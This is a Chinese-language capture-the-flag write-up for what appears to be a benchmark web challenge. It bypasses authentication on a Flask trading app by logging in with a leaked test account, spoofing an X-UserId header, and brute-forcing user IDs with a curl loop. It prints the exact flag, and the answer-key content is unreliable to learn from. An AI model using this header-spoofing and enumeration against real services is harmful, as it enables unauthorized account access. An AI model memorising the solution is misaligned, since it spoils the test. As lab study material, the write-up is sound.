## 题解

### 入口与指纹

`Apache` + `mod_wsgi` + Flask，与 `xben-001/002-24` 同属 Trading Platform 模板。
首页注释给出账号：

```html
<!-- TODO: Delete the testing account (test:test). -->
```

两步登录（第一步只提交用户名）：

```bash
curl -sS -c cj -b cj -X POST -d 'username=test' http://$T/
# 302 -> /password/test  （隐藏字段 user_id=10032）
curl -sS -c cj -b cj -X POST \
  -d 'username=test&user_id=10032&password=test' http://$T/password/test
# 302 -> /dashboard
# session=eyJ1c2VyX2lkIjoxMDAzMn0...
```

**与 001/002 最大的不同：登录后没有任何业务页面**。导航里只有 `Logout`，
`/orders`、`/orders_archive`、`/profile` 全部 404。整个应用只有
`GET /`、`POST /`、`GET|POST /password/<username>`、`GET /dashboard`、`POST /logout` 五个路由。

所以本题的越权点只能在 `/dashboard` 本身。

### 关键观察

**1. `/dashboard` 除了读 session，还读一个请求头。**

```
GET /dashboard
Cookie: session=<签名 session>
X-UserId: <任意数字>
```

| 请求 | 结果 | 判据 |
| --- | --- | --- |
| 只带 session | 200，`Welcome, John Doe` | 正常 |
| `X-UserId: 10032` | 200，`Welcome, John Doe` | 与 session 一致 |
| `X-UserId: 1` | **400** `Authentication Failed: invalid UserID (1)` | 头被读取了，但这个 ID 不存在 |
| `X-UserId: 10052` | **400** 同上 | 存在性校验通过后才会切换身份 |

关键：**返回 400 而不是忽略该头**，说明服务端确实用它做了一次 `User.query.get(id)`；
只是本实例里这些 ID 不存在。换个存在的 ID 就能拿到对应身份。

**2. 本实例的 ID 空间是 `10xxx`，且被随机化。**

`test` 是 `10032`。对 `X-UserId` 扫 `10000`–`11000` 得到两个有效值：

```text
10032 -> John Doe
10422 -> Flag flag{d4031c9d-8510-4321-883a-9e9b87546474}
```

`10422` 的 `first_name` 是 `Flag`，`last_name` 就是 flag 本体——
`/dashboard` 的模板把 `first_name` 和 `last_name` 拼在标题里，于是 flag 直接落在页面上。

注意：源码里的默认 ID 是 `10052`，在本实例**无效**。说明每次部署时种子数据的 ID 会变，
**必须自己枚举**，不能照抄。

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)

# 1. 用首页注释给的账号两步登录
curl -sS -c $cj -b $cj -X POST -d 'username=test' "http://$T/"
curl -sS -c $cj -b $cj -X POST \
  -d 'username=test&user_id=10032&password=test' "http://$T/password/test"

# 2. 枚举 X-UserId：200/有 Welcome 即存在，400 即不存在
for id in $(seq 10000 11000); do
  out=$(curl -sS -b $cj -H "X-UserId: $id" "http://$T/dashboard")
  case "$out" in
    *flag{*) echo "$id  $out"; break;;
  esac
done
```

命中 `10422`，页面标题是：

```html
<h5 class="card-title">Welcome, Flag flag{d4031c9d-8510-4321-883a-9e9b87546474}</h5>
```

### flag 位置

用户记录 `id=10422` 的 `last_name` 字段，经 `/dashboard` 的 `Welcome, {{first_name}} {{last_name}}`
渲染到页面上。需要 `X-UserId` 头才能切换到该身份。

## 复盘

- **`400 invalid UserID (x)` 本身就是最强的信号。** 它同时告诉你三件事：
  这个头被读取、值被拿去做存在性查询、查询失败会明确报错。
  比"头被忽略、返回 200"有用得多——后者才需要继续猜。
- **ID 空间要按"相邻值"去猜。** 题目提示（本库的 `content`）就一句话：
  「看到像 ID 的值就 fuzz 相邻值」。`test=10032` 是唯一锚点，扫 `10000`–`11000` 即可。
- **不要照抄默认种子。** 同一份应用源码的默认 `flag` 用户 ID 是 `10052`，
  但本实例是 `10422`。**实例化会重新分配 ID**，这类题必须以靶场实测为准。
- **认证头可以被放在任意位置。** `X-UserId` 这类"内部网关注入的用户身份"在真实系统里很常见
  （`X-Forwarded-User`、`X-Auth-Request-User`、`X-Remote-User`）。
  测试清单里应当包含：常见前缀 × 常见后缀（`X-User-Id` / `X-UserId` / `X-User` /
  `X-Username` / `X-Auth-User` …）。
- 与 001/002 的对比：001 漏洞在**读接口无校验**，002 在**写接口无校验**，
  003 在**认证源可被请求头覆盖**。同一个交易平台模板，三种不同的越权根因。
